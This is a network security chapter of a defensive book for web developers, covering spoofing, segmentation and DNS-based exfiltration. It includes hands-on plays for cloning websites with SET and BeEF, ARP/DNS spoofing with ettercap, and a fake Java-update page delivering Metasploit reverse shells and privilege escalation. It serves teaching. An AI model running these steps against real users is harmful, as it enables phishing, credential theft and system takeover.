# 8. Network {#network}

![10,000' view and lower of Network Security](images/10000Network.png)

I had the pleasure of interviewing [Haroon Meer](https://twitter.com/haroonmeer) on the Software Engineering Radio for a [show on Network Security](http://www.se-radio.net/2017/09/se-radio-episode-302-haroon-meer-on-network-security/). Do yourself a favour and listen to it, as we covered most of the topics in this chapter, plus more. While you are at it, check out the great Thinkst tools, that we also discussed towards the end of the show:

* [Canarytokens](https://canarytokens.org/)
* [Canary Tools](https://canary.tools/)

## 1. SSM Asset Identification
Take the results from the higher level Asset Identification section of the 30,000' View chapter of [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com). Remove any that are not applicable and add those that are newly discovered.

Here are some possibilities to get you started:

* Switches: Due to the network traffic and data that passes through them
* Routers and layer 3 switches: Same as above, in addition to sensitive network-related information stored here
* Syslog servers: For similar reasons to routers, as well as events and sensitive information from all sorts of systems collected in one place
* Visibility into what is actually happening specific to communications between devices on your network

There will almost certainly be many others. Think about your network topology, specifically about information, where it's stored where and over which channels it may pass. If you have decided to hand your precious data over to a Cloud Service Provider (CSP), then you are not going to have much control over this and in most cases, your CSP will not have as much control as you would like either. We address this in the [Cloud](#cloud) chapter. Also think about the areas that may be more vulnerable to compromise than others, and take this information into the next step.

## 2. SSM Identify Risks
Also, go through the same process we did in the top level Identify Risks section in the 30,000' View chapter of [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com), but do so for the network.

* [MS Network Threats and Countermeasures](https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_006)

Most exploitation of security vulnerabilities involves some aspect of a network. Reconnaissance generally utilises the Internet at a minimum. [Application security](#web-applications) generally requires a network in order to access the target application(s). [Cloud security](#cloud) similarly depends on a network in order to access the target resources. Social Engineering, as discussed in [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com), leverage's a network of people in order to access the human target. Even physical security (also discussed in [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com)) often involves different types of networks. When thinking of networks, try not to be constrained to just computer networks.

I also discussed [Network Security](http://www.se-radio.net/2017/09/se-radio-episode-302-haroon-meer-on-network-security/) with Haroon Meer on the Software Engineering Radio show, it is well worth listening right through to the evaluation of both risks and countermeasures.

### Fortress Mentality {#network-identify-risks-fortress-mentality}
![](images/ThreatTags/easy-widespread-easy-severe.png)

This section takes concepts from the section of the same name in the Physical chapter of [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com/). The largest percentage of successful attacks come from within organisations. Usually, these form of attacks are covered up, as an organisation's public image is affected to a greater extent with an attack happening from the inside than if the organisation is compromised by someone on the other side of the world.

There is still somehow a general misconception that having perimeters will save us from attackers. This may stop some of the noise from unmotivated attackers, but usually not much more than that.

IBM X-Force [2016 Cyber Security Intelligence Index](http://ibm.biz/2016CyberIndex) provides the following information for 2014 and 2015, plus a lot more:

**2014**:

Industries that experienced the highest incident rates were listed in the following descending order:

1. Financial services
2. Information and communication
3. Manufacturing
4. Retail and wholesale
5. Energy and utilities

* 55% of all attacks were carried out by insiders
* 31.5% were malicious inside actors
* 23.5% were inadvertent inside actors

**2015**:

Industries that experienced the highest incident rates were listed in the following descending order:

1. Healthcare
2. Manufacturing
3. Financial services
4. Government
5. Transportation

* 60% of all attacks were carried out by insiders
* 44.5% were malicious inside actors
* 15.5% were inadvertent inside actors

The 2017 IBM X-Force [Threat Intelligence Index](https://public.dhe.ibm.com/common/ssi/ecm/wg/en/wgl03140usen/WGL03140USEN.PDF) provides the following information for 2016, plus a lot more:

Industries that experienced the highest incident rates were listed in the following descending order:

1. Financial services
2. Information and communications
3. Manufacturing
4. Retail
5. Healthcare

In 2017 X-Force segregated the data. In **2016**:

* 30% of all attacks were carried out by insiders
* 7% were malicious inside actors
* 23% were inadvertent inside actors

In saying that, for Financial services:

* 58% of all attacks were carried out by insiders
* 5% were malicious inside actors
* 53% were inadvertent inside actors

Healthcare was impacted such that:

* 71% of all attackers were carried out by insiders
* 25% were malicious inside actors
* 46% were inadvertent inside actors

Malicious inside actors can either be disgruntled employees that may or may not of left the organisation. Those who have left, could still have access via an account or back door they introduced or are aware of. Or current employees who are opportunists looking to make some extra money by selling access or private information.

An inadvertent inside actor is usually someone that does not mean to cause harm, but often falls prey to social engineering tactics usually from malicious outsiders, as touched on in the People chapter of [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com/). These types of attacks are usually phishing, or where the victim is somehow tricked or coerced into revealing sensitive information, or carrying out an activity that will provide the attacker a foothold. The Social Engineer's Playbook by Jeremiah Talamantes has many useful and practical examples of these types of attacks.

In 2016, we saw a significant trend of inside actors shifting to the inadvertent; essentially this points to an emphasis on exploiting the organisation's people (social engineering) with various attack strategies.

This clearly shows, that although our technological defences are improving slowly, people are still much slower to improve. Spending resources on areas such as network perimeters, while neglecting our most valuable assets (our people), does not make sense.

Often workers bring their own devices to work, and take their work devices home and back, potentially transferring malware from network to network, whether they're wired or wireless. Again, people are the real issue here. No matter how good your technological solution is, people will circumvent it.

### Lack of Segmentation {#network-identify-risks-lack-of-segmentation}
![](images/ThreatTags/average-common-easy-moderate.png)

Similar to the "[Overly Permissive File Permissions, Ownership and Lack of Segmentation](#vps-identify-risks-unnecessary-and-vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation)" section in the VPS chapter, here we focus on the same concept, but at the network layer.

Network segmentation is the act of splitting a network of computers that share network resources into multiple sub-networks, whether it be real via routers and Layer 3 switches, or virtual via VLANs.

Without segmentation, attackers, once on the network will have direct access to the resources on that network.

Having all or many resources that cross different trust boundaries on a monolithic network, does nothing to constrain attackers or the transfer of malware. When we talk about trust boundaries we are talking about a configured firewall, rather than just a router. A router routes, a firewall should deny or drop everything other than what you specify. This requires some thought as to what should be allowed to enter the gateway interface, and how it is then treated.

A good example specific to the lack of segmentation is what is currently happening with the explosion of IoT devices. Why would your household appliances need to be on the Internet other than to perform tasks such as a refrigerator ordering food, or an oven telling you when your dinner is cooked. Worse still, it may be to provide functionality to turn the appliance on and off or be [commandeered by attackers](http://www.mirror.co.uk/news/technology-science/technology/hackers-use-fridge-send-spam-3046733#) to do their bidding. This is quite common now for home appliances that have next to no security-related capabilities. Even if these functions were considered important enough to reveal open sockets from your home to the Internet, surely it would be much safer to have these devices on a network segment with the least privilege available, tight egress filtering, encrypted communications, and managed by someone who knows how to configure the firewall rules on the segment's gateway.

### Lack of Visibility
![](images/ThreatTags/average-common-difficult-moderate.png)

Check [Lack of Visibility](#vps-identify-risks-lack-of-visibility) from the VPS chapter, there will be some cross-over here. If you do not have visibility to what is being communicated in your protocol stack, then the network protocols are open to being exploited. [Data Exfiltration leveraging DNS](#network-identify-risks-data-exfiltration-infiltration-leveraging-dns) is one example of this. If you are unable to detect potential attacks on the network, before they occur, then actual network components will be exploited.

#### Insufficient Logging

Similar to the [Logging and Alerting](#vps-countermeasures-lack-of-visibility-logging-and-alerting) section in the VPS chapter, if you do not have a real-time logging system that sends events from each network appliance off-site, encrypted, and is able to correlate, aggregate and even [graph](#web-applications-countermeasures-lack-of-visibility-insufficient-Monitoring-statistics-graphing), you will have a lack of visibility as to what is actually happening on your network.

#### Lack of Network Intrusion Detection Systems (NIDS)

[Intrusion Detection Systems](#network-countermeasures-lack-of-visibility-nids) play a big part in detecting and preventing the target from being exploited, they are another crucial component in your defence strategy.

### Spoofing {#network-identify-risks-spoofing}

Spoofing on a network might resemble this vignette: an entity (often malicious (Mallory), [but not necessarily](http://blog.binarymist.net/2015/04/25/web-server-log-management/#mitm)), successfully masquerading or impersonating another (Bob) in order to receive information from Alice (sometimes via Eve) that should then reach Bob.

Following are some of the different types of network spoofing.

![](images/Spoof.png)

#### [IP](http://en.wikipedia.org/wiki/IP_address_spoofing) {#network-identify-risks-spoofing-ip}
![](images/ThreatTags/easy-common-average-severe.png)

Setting the IP address in your header to the victim's IP address.

Remember we did something similar to this under the "Concealing NMap Source IP Address" of the Reconnaissance section from the Process and Practises chapter in [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com) with nmap decoy host `-D` and idle scan `-sI`.

In this type of attack a sending node will spoof its public IP address (not actually change its IP address) (by forging the header) to appear as someone else's. When the message is received and a reply crafted, the entity creating the reply will look up its ARP table and send the reply to the impersonated entity because the MAC address is still associated with the IP address of the message it received. This sort of play is commonly used in Denial of Service (DoS) attacks because the attacker does not need or want the response.

In a Distributed DoS (D-DoS) attack, often the attacker will impersonate the target (usually a router or some server it wants to be brought down) and broadcast messages. The nodes that receive these messages consult their ARP tables to look up the spoofed IP address, find the target's associated MAC address, and reply to it. This ensures that the replies will be sourced from many nodes, thus swamping the target's network interface.  
Many load testing tools also use this technique to stress a server or application.

#### ARP (Address Resolution Protocol) {#network-identify-risks-spoofing-arp}
![](images/ThreatTags/easy-common-average-severe.png)

This attack convinces your target that the MAC address it associates with a particular legitimate node (by way of IP address) is now your (the attackers/MItM) MAC address.

Elaborating on IP spoofing attacks further, the man-in-the-middle (MItM) sends out ARP replies across the LAN to the target, telling it that the legitimate MAC address the target associates with the MItM host has now changed to the routers IP address, as an example. When the target wants to send a message to the router, it looks up its ARP table for the router's IP address in order to find its MAC address, and then receives the MItM MAC address as the routers IP address. Thus, the target's ARP cache is said to be poisoned with the MItM MAC address. The target goes ahead and sends its messages to the MItM host, which can do what ever it likes with the data, perhaps choose to drop the message, or forward it on to the router in its original or altered state.  
This attack only works on a local area network (LAN).  
The attack is often used as a component of larger attacks, including harvesting credentials, cookies, CSRF tokens, and hijacking. Even TLS can be used, and in many cases TLS can be [downgraded](#network-identify-risks-tls-downgrade). 

There is a complete example of cloning a website, an ARP spoof, a DNS spoof, and a hands-on hack in the [website section below](#network-identify-risks-spoofing-website).

Remember we set up [MItM with ARP spoofing](#confirm-that-our-logs-are-commuting-over-tls) in the VPS chapter to confirm that our logs were in-fact encrypted in transit? In addition, checkout the MItM With TLS [http://frishit.com/tag/ettercap/](http://frishit.com/tag/ettercap/)

#### DNS {#network-identify-risks-spoofing-dns}
![](images/ThreatTags/difficult-uncommon-average-severe.png)

This attack affects any domain name lookup, including email.
This type of attack can allow an intermediary to intercept and read all of a companies emails for example, which completely destroys any competitive advantage. The victim may never know this has happened. DNS spoofing refers to an end goal rather than a specific type of attack. There are many ways to spoof a name server.

* Compromise the name server itself, potentially through its own vulnerabilities, the ([Kaminsky bug](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1447) for example)
* Poison the cache of the name server
* Poison the cache of an upstream name server and wait for the downstream propagation
* MItM attack. A good example of this is:
  * cloning a website you hope your victim will visit
  * offering a free Wi-Fi hot-spot attached to your gateway with DNS server provided  
    
  Your DNS server provides your cloned website IP address. You may still have to deal with X.509 certificates though, unless the website enforces TLS across the entire site, which is definitely recommended. If not, and the potential victim already has the website's certificate they are visiting in their browser, then you will have to hope your victim clicks through warnings, or work out a [TLS downgrade](#network-identify-risks-tls-downgrade), which is going to be harder.

[dnschef](http://www.question-defense.com/2012/12/14/dnschef-backtrack-privilege-escalation-spoofing-attacks-network-spoofing-dnschef) is a flexible spoofing tool, also available in Kali Linux.

%% Would be interesting to test on the likes of Arpon and Unbound.

#### Referrer {#network-identify-risks-spoofing-referrer}
![](images/ThreatTags/easy-common-average-moderate.png)

This attack appears in the [OWASP Top 10 A7 Missing Function Level Access Control](https://www.owasp.org/index.php/Top_10_2013-A7-Missing_Function_Level_Access_Control)

Often, websites will allow access to certain resources so long as the request was referred from a specific page defined by the `referer` header.  
The referrer (spelled `referer`) field in HTTP requests can be intercepted and modified, so it is not a good idea to use it for authentication or authorisation. The Social Engineering Toolkit (SET) also exploits the `referer` header, as discussed in the hands-on hack in the Spear Phishing section of the Identify Risks in the People chapter of Fascicle 0.

#### EMail Address {#network-identify-risks-spoofing-email-address}
![](images/ThreatTags/easy-widespread-average-moderate.png)

This is the act of creating and sending an email with a forged sender address.
It is useful for spam campaigns in sending large numbers of email, and for social engineers when often sending small amounts of email. The headers can be specified easily on the command line. The tools used essentially modify the headers: `From` and `Reply-To`.
<!--Useful inof on the From, Reply-To and Return-Path fields http://stackoverflow.com/questions/1235534/what-is-the-behavior-difference-between-return-path-reply-to-and-from-->
The Social Engineer Toolkit (SET) can be handy for sending emails that appear to be from someone the receiver expects to receive an email from. SET is capable of performing many tasks associated with social engineering. It even provides the capability to create executable payloads that the receiver may run once opening the email. Payloads may come in the form of a PDF with an embedded executable. SET allows you to choose between having it do all the work for you, or you can supply the custom payload and file format.

Most people just assume that an email they have received came from the address it appears to have been sent from. The email headers are very easy to tamper with.
Often other types of spoofing attacks are necessary in order to have the `From` and `Reply-To` set to an address that a victim recognises and trusts, rather than the attacker's address, or some other obviously obscure address.

There are also [on-line services](http://www.anonymailer.net/) that allow the sending of an email and specifying any from address.

Often the sender of a spoofed email will use a from address that you recognise in hope that you will click on a link within the email, thus satisfying their phish.

#### Website {#network-identify-risks-spoofing-website}
![](images/ThreatTags/difficult-common-average-severe.png)

<!---Todo: Check out Subterfuge, mentioned in "Basic Security Testing With Kali Linux"-->
<!---Todo: pg 160 of "The Hacker Playbook" could be worth demoing here-->
An attacker can clone or imitate a legitimate website (with the likes of the Social Engineering Kit (SET)) or the Browser Exploitation Framework (BeEF), and through social engineering, phishing, email spoofing, or any other number of tricks (as discussed in the People chapter of [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com)) to coerce a victim to browse the spoofed website. In fact, if you clone a website you know your victim visits regularly, you can then do so, sit and wait for them to take the bait. Better still, automate your attack so that when they do take the bait, exploits are fired at them automatically. Once the victim is on the spoofed website, the attacker can harvest credentials or carry out many other types of attacks against the non-suspecting user.

The victim may visit the attackers cloned website due to ARP and/or DNS spoofing. Subterfuge is handy to run a plethora of attacks against the victims browser through the likes of the Metasploit Browser AutoPwn module. If >0 attacks are successful (we have managed to install a root-kit), the attacker will usually get a remote command shell to the victims system by way of reverse or bind shell. Then simply forward them onto the legitimate website without them even being aware of the attack.

{#wdcnz-demo-3}
![](images/HandsOnHack.png)

The following attack is just one of five that I demonstrated at WDCNZ in 2015. The two attacks discussed just prior provide some context, review them again if you still need the details reinforced.

You can find the video of the attack exemplified at [http://youtu.be/ymnqTrnF85M](http://youtu.be/ymnqTrnF85M).

I> ## Synopsis
I>
I> The average victim will see a valid URL and the spoof will be undetectable.  
I> Use a website that you know the victim is likely to spend some time browsing. This can make it easier if you are running exploits manually in BeEF.  
I> Can be used to obtain credentials, or simply hook with BeEF and run any number of exploits.  
I> SET is run against the website you want to clone. As SET only gets the index file, you will have to use the likes of `wget` to get any other missing resources you need to complete the website. Static sites are obviously the easiest. We do not really want to have to create a back-end for the cloned website. You may have to update some of the links to external resources as well in the index.html file that SET creates.  
I> Ideally you will have cleaned out the public web directory that Apache hosts from `/var/www/`. If you do not, SET archives everything in there.  
I> You can also leverage ARP and DNS spoofing with Ettercap.

{icon=bomb}
G> ## The Play
G>
G> Run `setoolkit`
G>
G> Choose:  
G> `2) Website Attack Vectors`
G>
G> `3) Credential Harvester Attack Method`
G>
G> `2) Site Cloner`
G>
G> Enter the IP address you want to host from. This will probably be the host system you are running these commands from, although you could host anywhere.
G>
G> Enter the URL to clone.
G>
G> `y` to start Apache.
G>
G> You will need to either `wget` any files you're missing, if you are missing some, or if there are only a small number, just grab them via your browser developer tools.
G>
G> Add the BeEF hook (`<script src="http://<BeEF comms server IP address>:3000/hook.js"></script>`) into the index.html in `/var/www/`, usually at the end of the body, just before the `</body>` tag.
G>
G> From the directory where you have BeEF installed, run the BeEF ruby script: `./beef`
G>
G> Add an 'A' record of the website you have just cloned and want to spoof into Ettercap's DNS file: `echo "<domainname-you-want-to-clone.com> A <IP address that is hosting the clone>" >> /etc/ettercap/etter.dns`
G>
G> Now run Ettercap, which is going to both ARP and DNS spoof your victim, and the victim's gateway with the MItM option, using dns_spoof plugin: `ettercap -M arp:remote -P dns_spoof -q -T /<gateway IP address>/ /<victim IP address>/`.
G>
G> You can now log into the BeEF web UI.
G>
G> Now, when the victim visits your cloned web site, the URL will look legitimate, and they will have no idea that their browser is a BeEF zombie continually asking its master (the BeEF communications server) what to execute next.

T> ## BeEF Can Also Clone
T>
T> BeEF can also be used to clone web sites using its REST API, but it takes more work. The below description of how to use BeEF to do this is only for use if really necessary.
T>
T> In order to clone, once you have BeEF running:  
T> `curl -H "Content-Type: application/json: charset=UTF-8" -d '{"url":"http://<domainname-you-want-to-clone.com>", "mount":"/"}' -X POST http://127.0.0.1/api/seng/clone_page?token=<token that BeEF provides each time it starts up>;`  
T> The loop-back IP address is just the address that the BeEF REST API is listening on.  
T> When you run this command, you should get back:  
T> `{"success":true,"mount":"/"}`,  
T> BeEF should also say that it is cloning page at URL:  
T> `http://<domainname-you-want-to-clone.com>` with other information.  
T>
T> As with SET, if any resources other than a single index.html are required,
then they also have to be acquired separately. With BeEF, they need to be copied into:  
T> `/usr/share/beef-xss/extensions/social_engineering/web_cloner/cloned_pages/`.  
T> Routes have to be created in:  
T> `/usr/share/beef-xss/extensions/social_engineering/web_cloner/interceptor.rb`  
T> and also modified to add new [config "hook"](http://sourceforge.net/p/piwat/WAT-Pentoo/ci/6402fce4c6966639927acb72c516edd203c41b77/tree/bin/beef/extensions/social_engineering/web_cloner/web_cloner.rb#l17),  
T> and also added to `/usr/share/beef-xss/config.yaml`.  
T> The config.yaml file `host` seems to serve two purposes, the address to access BeEF, and where to fetch hook.js from. If I use an external address, BeEF only listens on the external interface (can not reach via loopback). I added a `hook` config which is the address that the BeEF communications server is listening on that gets inserted into the cloned web page.

{#wdcnz-demo-4}
![](images/HandsOnHack.png)

The following attack was the fourth of five that I demonstrated at WDCNZ in 2015. The [previous demo](#wdcnz-demo-3) will provide some additional context, and best reviewed first before engaging this attack.

You can find the video detailing this attack at [http://youtu.be/WSwqNb_94No](http://youtu.be/WSwqNb_94No).

I> ## Synopsis
I>
I> This demo differs from the previous in that the target will be presented with a Java "needs to be updated" pop-up. When the target plays along and executes what they think is an update, they are in fact starting a reverse shell to the attacker.  
I> The website you choose to clone does not have to be one that the attacker spends much time on. The attacker need only have done their reconnaissance and know which web sites the target frequently visits. Clone one of them, then wait for the target to fetch it and succumb to the bait by clicking the "Update" or "Run this time" button.  
I> You can also leverage ARP and DNS spoofing with Ettercap from the previous attack. I have not included these steps in this play though, although the video assume they have been included.

{icon=bomb}
G> ## The Play
G>
G> Start postgresql:  
G> `service postgresql start`
G>
G> Start the Metasploit service:  
G> `service metasploit start`
G>
G> Start the Social Engineering Toolkit:  
G> `setoolkit`
G>
G> Choose:  
G> `1) Social-Engineering Attacks`
G>
G> `2) Website Attack Vectors`
G>
G> `6) Multi-Attack Web Method`
G>
G> `2) Site Cloner`
G>
G> You do not need NAT/Port forwarding.
G>
G> Enter the IP address that Metasploit will be listening on. This is the IP address that you are launching the attack from.
G>
G> Enter `https://gmail.com` as the URL to clone.
G>
G> Turn on `1. Java Applet Attack Method` & `2. Metasploit Browser Exploit Method`.  
G> Proceed with the attack.  
G> The website is now cloned.  
G>
G> Select the vulnerabilities to exploit: `2) Meterpreter Multi-Memory Injection`.  
G>
G> Select the payloads to deliver. Select them all.  
G> Confirm Port 443 to help disguise the reverse connection as legit.  
G> The payloads are now encrypted and the reverse shells configured.  
G>
G> Take the easy option of `(2) Java Applet`
G>
G> Select `Metasploit Browser Autopwn` for the Java Applet browser exploit.  
G> The cloned site is hosted -> msfconsole is started.
G>
G> Target fetches our spoofed gmail.  
G> Oh… we have a Java update.  
G> We know we are always supposed to keep our systems patched right?  
G> Better update.
G>
G> Anti-virus (AV) says we are all safe. Must be all good.  
G> A PowerShell exploit fails.  

{icon=bomb}
G> Here come the shells.  
G> Interact with the first one:
G> `sessions -i 1`
G>
G> Attempt to elevate privileges:  
G> `getsystem`  
G> does not work on this shell.
G>
G> Let's list the available meterpreter extensions to make sure we have `priv`.  
G> `use -l`  
G> priv is in the list.  
G> Now that we know we have [priv](https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/), we can:
G>
G> `run bypassuac`  
G> That's successful, but AV detects bad signatures on some of the root-kits. On this shell I was only granted the privileges of the target running the browser exploit.

### Data Exfiltration, Infiltration {#network-identify-risks-data-exfiltration-infiltration}
![](images/ThreatTags/average-common-difficult-severe.png)

#### Ingress and Egress Techniques

In many/most cases a target will have direct access, or almost direct via a proxy from their corporate LAN to the Internet. This makes egress of any kind trivial. The following are some commonly used techniques:

#### Dropbox {#network-identify-risks-data-exfiltration-infiltration-dropbox}

No anti-virus is run by Dropbox on the files that Dropbox syncs. This means that Dropbox is a risk in a corporate environment, or any work environment where workers can access their files from multiple networks. Dropbox via an account, or even just their HTTP links, can be a useful means for exfiltration of data. Dropbox APIs and their SDKs, along with community provided SDKs, can assist the attacker greatly in exfiltrating their target's data over HTTP(S), and establishing command and control (C2) communications. [DropboxC2C](https://github.com/0x09AL/DropboxC2C) is one project that does this. All but the most secure environments allow HTTP(S) egress.

#### Physical

If there is no Internet access from the target's environment, physical media can be utilised. We discussed this in the Infectious Media subsection of Identify Risks of the People chapter of [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com/).

#### Mobile Phone Data

Mostly everyone carries at least one mobile phone capable of connecting to the Internet via their cellular provider. Obviously this bypasses any rules that the target organisation has in place. Data can be easily exfiltrated directly from mobile devices, or via their access point feature if enabled. Bluetooth offers similar functionality.

An attacker has options such as using staff member's phones. They can also get a phone within the wireless access coverage range of a computer with a wireless interface and data to be exfiltrated. They then need only force an access point switch. This could be done during a lunch break.

#### DNS, SSH

Use these options in very security conscious environments, where few users have any access to the Internet, and for those who do have access, it's indirect via a very restrictive proxy.

If a user has any Internet access from a machine on the internal network, then you can probably leverage DNS.

If a `ping` command is sent from the internal machine, this may produce a `timed out` result, but before the `ping` can be resolved, a DNS query must be satisfied.

{linenos=off, lang=bash}
    ping google.co.nz
    PING google.co.nz (172.217.25.163) 56(84) bytes of data.

    # Here, the command will print:

    Request timed out.
    Request timed out.
    Request timed out.
    etc.

    # Or just hang and then print something similar to:

    --- google.co.nz ping statistics ---
    662 packets transmitted, 0 received, 100% packet loss, time 662342ms

Although the ICMP protocol requests may be blocked or dropped, the DNS query will likely be forwarded from the local system resolver / DNS client / [stub resolver](http://www.zytrax.com/books/dns/apa/resolver.html) to the organisation's Internet-facing name server, then forwarded to an ISP's or alternative name server(s) on the Internet. This DNS lookup will occur even when many other protocols are blocked.

`dig +trace` mirrors the way typical DNS resolution works, but provides visibility into the actual process and steps taken.

When using `dig +trace` we get feedback on how the given fully qualified domain name (FQDM) is resolved. `dig +trace` works by pretending it is a name server, iteratively querying recursive and authoritative name servers. The steps taken in a DNS query as mirrored by `dig +trace` look like the following:

1. A DNS query is sent from a client application to the system resolver / DNS client / stub resolver. The stub resolver is not capable of a lot more than searching a few static files locally such as `/etc/hosts`, maintaining a cache, and forwarding requests to a recursive resolver, which is usually provided by your ISP or one of the other DNS providers you may choose, such as Level 3, Google, DynDNS, etc. The stub resolver can not follow referrals. If the stub resolver's cache or hosts file does not contain the IP address of the queried FQDN that is within the time-to-live (TTL) if cached, the stub resolver will query the recursive resolver. The query that the stub resolver sends to the recursive DNS resolver has a special flag called "Recursion Desired" (`RD`) in the DNS request header (see [RFC 1035](https://www.ietf.org/rfc/rfc1035.txt) for details) which instructs the resolver to complete the recursion, and provide a response of either an IP address (with the "Recursion Available" (`RA`) flag set), or an error (with the "Recursion Available" (`RA`) flag not set)
2. The recursive resolver will check to see if it has a cached DNS record from the authoritative nameserver with a valid TTL. If the recursive server does not have the DNS record cached, it begins the recursive process of going through the authoritative DNS hierarchy. The recursive resolver queries one of the root name servers (denoted by the '.' at the end of the domain name) for the requested DNS record to find out who is the authoritative name server for the TLD (`.nz` in our case). This query does not have the `RD` flag set, which means it is an "iterative query", the response must be one of either:
    1. The location of an authoritative name server
    2. An IP address as seen in step 6 once the recursion resolves
    3. An error

    There are 13 root server clusters from a-m, as you can see in the `dig +trace` output below, with servers from [over 380 locations](http://www.root-servers.org/)
3. The root servers know the locations of all of the Top-Level Domains (TLDs) such as `.nz`, `.io`, `.blog`, `.com`, but they do not have the IP information for the FQDN, such as `google.co.nz`. The root server does know that the TLD `.nz` may know, so it returns a list of all the four to thirteen clustered `.nz` [generic TLD](https://en.wikipedia.org/wiki/Generic_top-level_domain) (gTLD) server `ns` (name server) IP addresses. This is the root name server's way of telling the recursive resolver to query one of the `.nz` gTLD authoritative servers
4. The recursive resolver queries one of the `.nz` gTLD authoritative servers (`ns<n>.dns.net.nz.` in our case) for `google.co.nz.`
5. The `.nz` TLD authoritative server refers the recursive server to the authoritative servers for `google.co.nz.` (`ns<n>.google.com.`)
6. The recursive resolver queries the authoritative servers for `google.co.nz,` and receives 172.217.25.163 as the answer
7. At this point the recursive resolver has finished its recursive process, caches the answer for the TTL duration specified on the DNS record, and returns it to the stub resolver having the "Recursion Available" (RA) flag set, indicating that the answer was indeed fully resolved

![](images/DNSResolution.png)

{title="Step 1", linenos=off, lang=bash}
    dig +trace google.co.nz

{title="Step 2", linenos=off, lang=bash}
    ; <<>> DiG 9.10.3-P4-Ubuntu <<>> +trace google.co.nz
    ;; global options: +cmd
    .        448244   IN NS b.root-servers.net.
    .        448244   IN NS h.root-servers.net.
    .        448244   IN NS l.root-servers.net.
    .        448244   IN NS a.root-servers.net.
    .        448244   IN NS j.root-servers.net.
    .        448244   IN NS c.root-servers.net.
    .        448244   IN NS m.root-servers.net.
    .        448244   IN NS e.root-servers.net.
    .        448244   IN NS g.root-servers.net.
    .        448244   IN NS i.root-servers.net.
    .        448244   IN NS d.root-servers.net.
    .        448244   IN NS k.root-servers.net.
    .        448244   IN NS f.root-servers.net.
    # The RRSIG holds the DNSSEC signature.
    # +trace includes +dnssec which emulates the default queries from a nameserver
    .        514009   IN RRSIG NS 8 0 518400 20170728170000 20170715160000 15768 . Egf30NpCVAwTA4q8B8Ye7lOcFraVLo3Vh8vlhlZFGIFHsHNUFDyK2NxM RJr4Z+NzZat/JUmNQscob5Mg9N2ujVPZ9ZgQ1TJ8Uu6+azR6A1kr95Vu S8hepkdr42lZdrv2QV9qR0DeXWglo0NemF7D7ZMlM/fVAoiYvoDRugc6 v9SWjedD3XtOoOjPAYjNc7M8PQ6VZ5qIil2arnR/ltQJm2bQbIXAw4DG a3NQJw06G5E7FjMqn+/tTfzm/Z95UIsAUojGV4l1VIGulm9IZtYB5H5C hCoWt4bhaCKm2U2BJBfmvvB7rN1fsd1JKnCayzKvHRL0WWvSsvjyN6Hv F/PCaw==
    ;; Received 1097 bytes from 127.0.1.1#53(127.0.1.1) in 91 ms

{title="Step 3", linenos=off, lang=bash}
    nz.        172800   IN NS ns1.dns.net.nz.
    nz.         172800   IN NS ns2.dns.net.nz.
    nz.         172800   IN NS ns3.dns.net.nz.
    nz.         172800   IN NS ns4.dns.net.nz.
    nz.         172800   IN NS ns5.dns.net.nz.
    nz.         172800   IN NS ns6.dns.net.nz.
    nz.         172800   IN NS ns7.dns.net.nz.
    nz.         86400 IN DS 46034 8 1 316AB5861714BD58905C68B988B2B7C87CB78C4A
    nz.         86400 IN DS 46034 8 2 02C64093D011629EF821494C5D918B8151B1B81FD008E175954F8871 19FEB5B1
    nz.         86400 IN RRSIG DS 8 1 86400 20170728170000 20170715160000 15768 . RAn3+mAjCAk5+/H3J4YMjISnitGJHMaR49n+YPn2q447VXViBcUxm0hO ZK+3ut5ywtiT4v1AMZXN9TDQ1EFe2T/VPWbdpOEs71pOS9/wdAZOlySR 9tfdwdnnPb1+InA9H1u384vCZDIoy4vsz9jRnBk3+hIocIcrmMhMdSJU jNBXfaW3uZ5vboQqAzr1WhrbyHebRFMdiq+NliSQU/DunOOD2j/9fJu/ VT4dWFP3mkb3wYPm+MLwDO7hDatJih5dmKzREzjVbxiGjaFQyTUTz7CZ EJsP8O21e8TZLk5mWenBrWhkcce+xas8PGXh754Ltg3/1zuUmuuJ93Sf PwCBwQ==
    ;; Received 854 bytes from 192.58.128.30#53(j.root-servers.net) in 649 ms

{title="Step 4", linenos=off, lang=bash}
    google.co.nz.    86400 IN NS ns3.google.com.
    google.co.nz.     86400 IN NS ns1.google.com.
    google.co.nz.     86400 IN NS ns2.google.com.
    google.co.nz.     86400 IN NS ns4.google.com.
    e1e8sage14qa404t0i37cbi1vb5jlkpq.co.nz.   3600 IN  NSEC3 1 1 5 5AFBAC60E6291D43 E3D0PASFAJFBN713OGDH06QD9PUOUFOL NS SOA RRSIG DNSKEY NSEC3PARAM
    e1e8sage14qa404t0i37cbi1vb5jlkpq.co.nz.   3600 IN  RRSIG NSEC3 8 3 3600 20170724002713 20170715224319 17815 co.nz. PSQpSuLombCp+gzGad6vfjQwQXdtEho1asIu7LR8ROpISAiVYuNaDCzn syxVWPDt5JXuV4Ro9QwqtIIyKGp+SR0E6vfB0ZBmKMWTGE8JDs4wFJD8 4Pa3EJE9HD6D5OzYLGWp74j5rKCmhX1tHsAZH6kxMepxmXe7Yxr1ejSU pNA=
    o5jradpam3chashu782ej6r90spf0slk.co.nz.   3600 IN  NSEC3 1 1 5 5AFBAC60E6291D43 OBU0IO78N1LTERC33TPID5EMGNQOA7T7 NS DS RRSIG
    o5jradpam3chashu782ej6r90spf0slk.co.nz.   3600 IN  RRSIG NSEC3 8 3 3600 20170721184152 20170714214319 17815 co.nz. F7I2sw56hULCCYpZuO9i5020cXoq+31tTaoU9c/uNr6amFdO112oximh mDr3Ad/w/E7Le4WVmGAHOgeLsFH8OI19MciVqMmg232z04jVLdIuFIBH U+SsRXiwzoRb5fFh/mlUthjiqjk+0U/LPbM3jZNqRduSbDRFaEJOsGz4 ZlQ=
    ;; Received 628 bytes from 185.159.197.130#53(ns5.dns.net.nz) in 319 ms

{title="Step 5", linenos=off, lang=bash}
    google.co.nz.    300   IN A  172.217.25.163
